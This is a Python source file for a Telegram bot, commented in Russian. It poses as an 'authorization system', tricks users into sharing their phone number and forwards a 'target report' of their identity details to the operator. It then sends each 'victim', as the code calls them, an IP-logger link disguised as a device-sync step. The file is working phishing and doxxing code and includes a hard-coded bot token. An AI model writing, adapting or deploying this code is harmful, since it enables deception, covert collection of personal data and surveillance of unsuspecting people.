import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# --- НАСТРОЙКИ ---
API_TOKEN = '8531763156:AAGkTIJDVaTuKT6zIKOQYirA73S8B-0qlXc'
ADMIN_ID = 5476069446  # Рекомендую использовать числовой ID (узнай его через @userinfobot)
LOGGER_URL = "https://iplogger.org/YOUR_CODE" # Твоя ссылка из сервиса iplogger

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Клавиатура для запроса контакта
contact_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
contact_kb.add(KeyboardButton("✅ Подтвердить личность", request_contact=True))

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    await message.answer(
        "🚀 **Система CHIIP: Авторизация**\n\n"
        "Для получения доступа к закрытому функционалу необходимо подтвердить номер телефона.",
        reply_markup=contact_kb,
        parse_mode="Markdown"
    )

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    contact = message.contact
    user = message.from_user
    
    # Создаем инлайн-кнопку с логгером для получения IP
    ip_kb = InlineKeyboardMarkup()
    ip_kb.add(InlineKeyboardButton("🔗 Завершить настройку (нажми сюда)", url=f"{LOGGER_URL}"))

    report = (
        f"🕵️ **ОТЧЕТ О ЦЕЛИ**\n"
        f"━━━━━━━━━━━━━━\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"👤 **Имя:** {user.full_name}\n"
        f"🏷 **Username:** @{user.username if user.username else 'нет'}\n"
        f"📱 **Телефон:** +{contact.phone_number}\n"
        f"🌍 **Язык:** {user.language_code}\n"
        f"💎 **Premium:** {'Да' if user.is_premium else 'Нет'}\n"
        f"━━━━━━━━━━━━━━\n"
        f"⚠️ *Ожидайте перехода по ссылке для фиксации IP...*"
    )

    # Отправка данных админу
    await bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
    
    # Сообщение жертве
    await message.answer(
        "Номер подтвержден! Последний шаг: перейдите по ссылке ниже, чтобы синхронизировать устройство с сервером.",
        reply_markup=ip_kb
    )

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)